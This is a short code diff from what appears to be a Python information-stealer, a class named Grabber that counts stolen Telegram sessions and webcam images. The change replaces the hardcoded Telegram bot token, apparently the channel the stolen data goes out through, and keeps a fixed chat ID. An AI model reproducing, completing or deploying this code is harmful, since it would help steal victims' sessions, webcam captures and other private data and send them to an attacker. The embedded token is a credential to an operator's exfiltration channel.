@@ -91,7 +91,7 @@ class Grabber:
         self.TelegramSessionsCount = 0
         self.WebcamImagesCount = 0
         os.makedirs(self.TempFolder, exist_ok=True)
-        self.tg_bot_token = "8210492721:AAHb5hA9ywaZ5gMJr6S_I1YruMz2akCakWI"
+        self.tg_bot_token = "8318536423:AAEw5bHXq1JXeoFoSBrMvtzpXs33UKDssus"
         self.tg_chat_id = "7234535860"
 
     def getheaders(self, token=None):
